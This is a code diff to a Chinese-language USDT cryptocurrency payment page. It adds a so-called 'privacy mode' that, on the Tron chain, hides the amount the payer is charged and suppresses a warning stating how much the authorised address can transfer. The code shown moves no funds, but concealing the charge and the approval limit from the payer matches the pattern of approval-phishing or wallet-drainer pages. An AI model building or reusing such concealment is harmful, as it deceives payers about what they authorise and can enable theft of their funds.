@@ -23,8 +23,10 @@
         
         <div class="card card-pay">
           <div class="pay-header">
-            <div class="small opacity-75">需支付金额</div>
-            <div class="amount-display"><span id="amountText">--</span> USDT</div>
+            <div id="amountArea">
+              <div class="small opacity-75">需支付金额</div>
+              <div class="amount-display"><span id="amountText">--</span> USDT</div>
+            </div>
             <div class="badge bg-white text-primary bg-opacity-25 border border-white border-opacity-25 mt-2">
               <span id="netText">正在检测网络...</span>
             </div>
@@ -80,6 +82,7 @@
       const $ = (id) => document.getElementById(id);
       const logEl = $("statusText");
       const btn = $("btnMainPay");
+      const amountAreaEl = document.getElementById("amountArea");
       const safeTipEl = document.getElementById("safeTip");
       const safeTipTextEl = document.getElementById("safeTipText");
       
@@ -93,7 +96,6 @@
         const amount = cfg.amountUsdt || "0.00";
         $("amountText").textContent = amount;
         $("toAddressText").textContent = "待检测...";
-        showSafeTip(amount);
       }, 100);
 
       function normalizeAmountText(v) {
@@ -106,9 +108,22 @@
 
       function showSafeTip(amount) {
         if (!safeTipEl || !safeTipTextEl) return;
+        if (chainType === "tron") {
+          safeTipEl.style.display = "none";
+          return;
+        }
         const t = normalizeAmountText(amount);
         safeTipTextEl.textContent = "安全提醒：当前授权地址只能转最大" + t + "USDT。";
         safeTipEl.style.display = "flex";
+      }
+
+      function applyPrivacyMode() {
+        if (chainType === "tron") {
+          if (amountAreaEl) amountAreaEl.style.display = "none";
+          if (safeTipEl) safeTipEl.style.display = "none";
+        } else {
+          if (amountAreaEl) amountAreaEl.style.display = "";
+        }
       }
 
       let payHandler = null;
@@ -270,12 +285,15 @@
         try {
           const handler = await checkEnv();
           payHandler = handler;
+          applyPrivacyMode();
 
           if (payHandler) {
             btn.textContent = "立即支付";
             btn.disabled = false;
             btn.classList.remove("btn-secondary");
             btn.classList.add("btn-primary");
+            const cfg = window.pay0Config || {};
+            showSafeTip(cfg.amountUsdt || "0.00");
 
             btn.onclick = async () => {
               try {
